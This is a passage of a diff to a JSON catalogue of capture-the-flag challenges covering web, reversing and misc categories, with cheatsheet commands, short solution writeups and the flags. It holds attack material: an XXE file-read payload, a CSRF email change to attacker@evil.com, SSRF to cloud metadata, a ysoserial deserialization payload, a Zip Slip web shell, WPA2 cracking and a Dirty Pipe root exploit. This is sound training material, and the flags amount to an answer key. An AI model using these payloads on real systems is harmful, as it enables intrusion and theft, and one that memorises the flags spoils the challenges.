     "cheatsheet": "curl -d '<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag.txt\">]><r>&x;</r>' target",
     "badge": "XML Sapper",
-    "writeup": "1. Intercept XML upload request in Burp Suite.\n2. Inject entity: `<!DOCTYPE x [ <!ENTITY leak SYSTEM \"file:///app/flag.txt\"> ]>`.\n3. Insert `&leak;` into XML body.\n4. Response reflects file content.\n5. Flag: `flag{xx3_3xt3rn4l_3nt1ty_f1l3_r34d}`"
+    "writeup": "1. Intercept XML upload request in Burp Suite.\n2. Inject entity: `<!DOCTYPE x [ <!ENTITY leak SYSTEM \"file:///app/flag.txt\"> ]>`.\n3. Insert `&leak;` into XML body.\n4. Response reflects file content.\n5. Flag: `flag{xx3_3xt3rn4l_3nt1ty_f1l3_r34d}`",
+    "track": "training"
   },
   {
     "id": "web-14",
@@ -2016,7 +2099,8 @@
     "concept": "Cross-Site Request Forgery, SameSite Cookies, Account Takeover",
     "cheatsheet": "Burp Suite -> Engagement Tools -> Generate CSRF PoC",
     "badge": "State Forger",
-    "writeup": "1. Generate CSRF form targeting `/profile/update-email` with `email=attacker@evil.com`.\n2. Deliver URL to victim administrator.\n3. Trigger password reset to claim administrator session and flag.\n4. Flag: `flag{csrf_p0st_f0rm_3m41l_t4k30v3r}`"
+    "writeup": "1. Generate CSRF form targeting `/profile/update-email` with `email=attacker@evil.com`.\n2. Deliver URL to victim administrator.\n3. Trigger password reset to claim administrator session and flag.\n4. Flag: `flag{csrf_p0st_f0rm_3m41l_t4k30v3r}`",
+    "track": "training"
   },
   {
     "id": "web-15",
@@ -2040,7 +2124,8 @@
     "concept": "GraphQL Forensics, Introspection Query, Batch Attacks, API Security",
     "cheatsheet": "npx graphql-voyager OR inql query https://target/graphql",
     "badge": "Schema Cartographer",
-    "writeup": "1. Run GraphQL introspection query via curl.\n2. Discover hidden query `systemFlag(secretKey: String)`.\n3. Execute query to retrieve the flag.\n4. Flag: `flag{gr4phql_1ntr0sp3ct10n_sch3m4_l34k}`"
+    "writeup": "1. Run GraphQL introspection query via curl.\n2. Discover hidden query `systemFlag(secretKey: String)`.\n3. Execute query to retrieve the flag.\n4. Flag: `flag{gr4phql_1ntr0sp3ct10n_sch3m4_l34k}`",
+    "track": "training"
   },
   {
     "id": "web-16",
@@ -2064,7 +2149,8 @@
     "concept": "DNS Rebinding, SSRF Bypass, Time-of-Check to Time-of-Use (TOCTOU), Cloud Metadata",
     "cheatsheet": "curl 'https://target/fetch?url=http://7f000001.c0a80101.rbndr.us/meta'",
     "badge": "DNS Conjurer",
-    "writeup": "1. Configure rebinding domain to toggle between public IP and `169.254.169.254`.\n2. Submit URL to proxy.\n3. Verification succeeds against public IP, while fetch retrieves AWS metadata token.\n4. Flag: `flag{dns_r3b1nd1ng_ssrf_m3t4d4t4_pwn}`"
+    "writeup": "1. Configure rebinding domain to toggle between public IP and `169.254.169.254`.\n2. Submit URL to proxy.\n3. Verification succeeds against public IP, while fetch retrieves AWS metadata token.\n4. Flag: `flag{dns_r3b1nd1ng_ssrf_m3t4d4t4_pwn}`",
+    "track": "training"
   },
   {
     "id": "web-17",
@@ -2088,7 +2174,8 @@
     "concept": "Java Deserialization, ysoserial, CommonsCollections Gadgets, Remote Code Execution",
     "cheatsheet": "java -jar ysoserial.jar CommonsCollections6 'touch /tmp/pwn' | base64",
     "badge": "Java Puppeteer",
-    "writeup": "1. Generate ysoserial payload with `CommonsCollections5`.\n2. Deliver via `X-Java-Serialized-Object` header.\n3. Server deserializes object, executing arbitrary commands and writing flag to output.\n4. Flag: `flag{j4v4_d3s3r14l1z4t10n_ys0s3r14l_rc3}`"
+    "writeup": "1. Generate ysoserial payload with `CommonsCollections5`.\n2. Deliver via `X-Java-Serialized-Object` header.\n3. Server deserializes object, executing arbitrary commands and writing flag to output.\n4. Flag: `flag{j4v4_d3s3r14l1z4t10n_ys0s3r14l_rc3}`",
+    "track": "training"
   },
   {
     "id": "rev-11",
@@ -2112,7 +2199,8 @@
     "concept": "WebAssembly, WABT wasm2wat, WAT Disassembly, Memory Blocks",
     "cheatsheet": "wasm2wat check.wasm | grep -C 5 data",
     "badge": "Wasm Dissector",
-    "writeup": "1. Run `wasm2wat check.wasm -o check.wat`.\n2. Locate the memory section: `(data (i32.const 1024) \"flag{w4sm_w4sm2w4t_byt3c0d3_r34d}\")`.\n3. Flag: `flag{w4sm_w4sm2w4t_byt3c0d3_r34d}`"
+    "writeup": "1. Run `wasm2wat check.wasm -o check.wat`.\n2. Locate the memory section: `(data (i32.const 1024) \"flag{w4sm_w4sm2w4t_byt3c0d3_r34d}\")`.\n3. Flag: `flag{w4sm_w4sm2w4t_byt3c0d3_r34d}`",
+    "track": "training"
   },
   {
     "id": "rev-12",
@@ -2136,7 +2224,8 @@
     "concept": ".NET Decompilation, CIL Bytecode, ILSpy, dnSpy",
     "cheatsheet": "ilspycmd Vault.exe -p > decompiled.cs",
     "badge": "C# Revealer",
-    "writeup": "1. Run `ilspycmd Vault.exe > source.cs`.\n2. Open `source.cs` and inspect `VerifyMasterKey` method.\n3. The hardcoded flag string is compared directly with user input.\n4. Flag: `flag{d0tn3t_csh4rp_1lspy_d3c0mp1l3}`"
+    "writeup": "1. Run `ilspycmd Vault.exe > source.cs`.\n2. Open `source.cs` and inspect `VerifyMasterKey` method.\n3. The hardcoded flag string is compared directly with user input.\n4. Flag: `flag{d0tn3t_csh4rp_1lspy_d3c0mp1l3}`",
+    "track": "training"
   },
   {
     "id": "rev-13",
@@ -2160,7 +2249,8 @@
     "concept": "Go Reversing, pclntab Structure, GoReSym, Static Binaries",
     "cheatsheet": "GoReSym -t -p ./target_go_bin",
     "badge": "Gopher Reverser",
-    "writeup": "1. Run `GoReSym ./target_go_bin > symbols.json`.\n2. Reconstruct `main.checkLicense` function in Ghidra.\n3. Follow the byte comparison loop to extract the flag.\n4. Flag: `flag{g0l4ng_pclnt4b_symb0ls_r3st0r3d}`"
+    "writeup": "1. Run `GoReSym ./target_go_bin > symbols.json`.\n2. Reconstruct `main.checkLicense` function in Ghidra.\n3. Follow the byte comparison loop to extract the flag.\n4. Flag: `flag{g0l4ng_pclnt4b_symb0ls_r3st0r3d}`",
+    "track": "training"
   },
   {
     "id": "rev-14",
@@ -2184,7 +2274,8 @@
     "concept": "Rust Reversing, Symbol Demangling, rustfilt, Iterators Assembly",
     "cheatsheet": "nm -C ./rust_app | grep 'crate_name'",
     "badge": "Rust Crab",
-    "writeup": "1. Demangle binary symbols using `rustfilt`.\n2. Locate `my_app::validate_flag` in Ghidra.\n3. Reverse the XOR mapping and bitwise rotation.\n4. Flag: `flag{rust_d3m4ngl3_1t3r4t0r_r3v}`"
+    "writeup": "1. Demangle binary symbols using `rustfilt`.\n2. Locate `my_app::validate_flag` in Ghidra.\n3. Reverse the XOR mapping and bitwise rotation.\n4. Flag: `flag{rust_d3m4ngl3_1t3r4t0r_r3v}`",
+    "track": "training"
   },
   {
     "id": "rev-15",
@@ -2208,7 +2299,8 @@
     "concept": "PE Format, IAT Hooking, OEP Unpacking, x64dbg Scylla",
     "cheatsheet": "x64dbg -> Plugins -> Scylla -> Dump -> Fix Dump",
     "badge": "PE Unpacker",
-    "writeup": "1. Trace execution in x64dbg until reaching the long jump to the OEP.\n2. Launch Scylla: click 'IAT Autosearch' and 'Get Imports'.\n3. Dump process to disk and fix PE headers.\n4. Open unpacked executable in Ghidra to view plain validation logic.\n5. Flag: `flag{14t_h00k1ng_scyll4_03p_dump3d}`"
+    "writeup": "1. Trace execution in x64dbg until reaching the long jump to the OEP.\n2. Launch Scylla: click 'IAT Autosearch' and 'Get Imports'.\n3. Dump process to disk and fix PE headers.\n4. Open unpacked executable in Ghidra to view plain validation logic.\n5. Flag: `flag{14t_h00k1ng_scyll4_03p_dump3d}`",
+    "track": "training"
   },
   {
     "id": "rev-16",
@@ -2232,7 +2324,8 @@
     "concept": "Android JNI, Frida Dynamic Instrumentation, Native Hooking, Shared Objects",
     "cheatsheet": "frida -U -n ph.gov.cylab -l hook.js",
     "badge": "Frida Enchanter",
-    "writeup": "1. Write Frida hook script intercepting `verifyFlag`.\n2. Log the raw C string pointers from `args[2]`.\n3. Enter random text in the app; Frida console prints expected flag string.\n4. Flag: `flag{fr1d4_jn1_n4t1v3_h00k_succ3ss}`"
+    "writeup": "1. Write Frida hook script intercepting `verifyFlag`.\n2. Log the raw C string pointers from `args[2]`.\n3. Enter random text in the app; Frida console prints expected flag string.\n4. Flag: `flag{fr1d4_jn1_n4t1v3_h00k_succ3ss}`",
+    "track": "training"
   },
   {
     "id": "rev-17",
@@ -2256,7 +2349,8 @@
     "concept": "eBPF Bytecode, Linux Kernel Tracing, LLVM eBPF Disassembler, Socket Filters",
     "cheatsheet": "bpftool prog dump xlated id <prog_id>",
     "badge": "eBPF Whisperer",
-    "writeup": "1. Dump raw eBPF bytecode section.\n2. Disassemble instructions: identify packet header offset checks.\n3. The eBPF filter requires a magic TCP sequence and specific payload bytes.\n4. Flag: `flag{3bpf_byt3c0d3_k3rn3l_f1lt3r_r3v}`"
+    "writeup": "1. Dump raw eBPF bytecode section.\n2. Disassemble instructions: identify packet header offset checks.\n3. The eBPF filter requires a magic TCP sequence and specific payload bytes.\n4. Flag: `flag{3bpf_byt3c0d3_k3rn3l_f1lt3r_r3v}`",
+    "track": "training"
   },
   {
     "id": "misc-11",
@@ -2280,7 +2374,8 @@
     "concept": "Zip Slip, Arbitrary File Overwrite, Archive Security, Path Traversal",
     "cheatsheet": "python3 -c \"import zipfile; # craft zip with ../../ path\"",
     "badge": "Archive Infiltrator",
-    "writeup": "1. Craft ZIP with filename `../../var/www/html/shell.php`.\n2. Submit ZIP to extraction endpoint.\n3. Access `shell.php` to execute commands and read flag.\n4. Flag: `flag{z1p_sl1p_p4th_tr4v3rs4l_wr1t3}`"
+    "writeup": "1. Craft ZIP with filename `../../var/www/html/shell.php`.\n2. Submit ZIP to extraction endpoint.\n3. Access `shell.php` to execute commands and read flag.\n4. Flag: `flag{z1p_sl1p_p4th_tr4v3rs4l_wr1t3}`",
+    "track": "training"
   },
   {
     "id": "misc-12",
@@ -2304,7 +2399,8 @@
     "concept": "Wireless Security, WPA2 PMKID, Hashcat 22000, hcxtools",
     "cheatsheet": "hashcat -m 22000 wifi.hc22000 /usr/share/wordlists/rockyou.txt",
     "badge": "Wi-Fi Cracker",
-    "writeup": "1. Extract PMKID using `hcxpcapngtool`.\n2. Run Hashcat mode 22000 against dictionary.\n3. Recovered password is the flag.\n4. Flag: `flag{wpa2_pmk1d_h4shc4t_cr4ck3d}`"
+    "writeup": "1. Extract PMKID using `hcxpcapngtool`.\n2. Run Hashcat mode 22000 against dictionary.\n3. Recovered password is the flag.\n4. Flag: `flag{wpa2_pmk1d_h4shc4t_cr4ck3d}`",
+    "track": "training"
   },
   {
     "id": "misc-13",
@@ -2328,7 +2424,8 @@
     "concept": "Aviation OSINT, ADS-B Transponders, FlightRadar24, ICAO Identifiers",
     "cheatsheet": "curl -s 'https://globe.adsbexchange.com/?icao=...'",
     "badge": "Sky Tracker",
-    "writeup": "1. Look up ICAO hex address in ADS-B Exchange historical database.\n2. Trace radar breadcrumb logs to destination airport (Zamboanga International Airport / RPMZ).\n3. Flag: `flag{4dsb_fl1ght_tr4ck1ng_1c40_0s1nt}`"
+    "writeup": "1. Look up ICAO hex address in ADS-B Exchange historical database.\n2. Trace radar breadcrumb logs to destination airport (Zamboanga International Airport / RPMZ).\n3. Flag: `flag{4dsb_fl1ght_tr4ck1ng_1c40_0s1nt}`",
+    "track": "training"
   },
   {
     "id": "misc-14",
@@ -2352,7 +2449,8 @@
     "concept": "Shadow Analysis, Suncalc, Ephemeris Geolocation, Chronolocation",
     "cheatsheet": "python3 -c \"import suncalc; # calculate solar azimuth & altitude\"",
     "badge": "Solar Cartographer",
-    "writeup": "1. Compute solar elevation angle: $\\arctan(1 / 1.42) = 35.1^\\circ$.\n2. In Suncalc: find time when sun was at $35.1^\\circ$ altitude and opposite bearing (228 degrees azimuth).\n3. Reconstructed timestamp matches target flag format.\n4. Flag: `flag{sunc4lc_sh4d0w_t1m3_g30l0c4t10n}`"
+    "writeup": "1. Compute solar elevation angle: $\\arctan(1 / 1.42) = 35.1^\\circ$.\n2. In Suncalc: find time when sun was at $35.1^\\circ$ altitude and opposite bearing (228 degrees azimuth).\n3. Reconstructed timestamp matches target flag format.\n4. Flag: `flag{sunc4lc_sh4d0w_t1m3_g30l0c4t10n}`",
+    "track": "training"
   },
   {
     "id": "misc-15",
@@ -2376,7 +2474,8 @@
     "concept": "Format String Exploitation, Arbitrary Memory Write (%n), GOT Overwriting, pwntools",
     "cheatsheet": "python3 -c \"from pwn import *; print(fmtstr_payload(6, {0x404018: 0x401150}))\"",
     "badge": "Format Smasher",
-    "writeup": "1. Determine argument stack offset using `%p.%p.%p...`.\n2. Write exploit using pwntools `fmtstr_payload` targeting `puts@GOT`.\n3. Send payload; next call to `puts` spawns interactive shell.\n4. Flag: `flag{fmtstr_4rb1tr4ry_wr1t3_g0t_pwn}`"
+    "writeup": "1. Determine argument stack offset using `%p.%p.%p...`.\n2. Write exploit using pwntools `fmtstr_payload` targeting `puts@GOT`.\n3. Send payload; next call to `puts` spawns interactive shell.\n4. Flag: `flag{fmtstr_4rb1tr4ry_wr1t3_g0t_pwn}`",
+    "track": "training"
   },
   {
     "id": "misc-16",
@@ -2400,6 +2499,7 @@
     "concept": "Kernel Exploitation, CVE-2022-0847, Dirty Pipe, Page Cache Corruption",
     "cheatsheet": "gcc dirtypipe.c -o dirtypipe && ./dirtypipe /etc/passwd 1 root::0:0...",
     "badge": "Kernel Overlord",
-    "writeup": "1. Compile Dirty Pipe C exploit.\n2. Execute exploit targeting `/etc/passwd` to remove root password prompt.\n3. Spawn root shell with `su -`.\n4. Read `/root/flag.txt`.\n5. Flag: `flag{d1rty_p1p3_cv3_2022_0847_r00t}`"
+    "writeup": "1. Compile Dirty Pipe C exploit.\n2. Execute exploit targeting `/etc/passwd` to remove root password prompt.\n3. Spawn root shell with `su -`.\n4. Read `/root/flag.txt`.\n5. Flag: `flag{d1rty_p1p3_cv3_2022_0847_r00t}`",
+    "track": "training"
   }
 ]
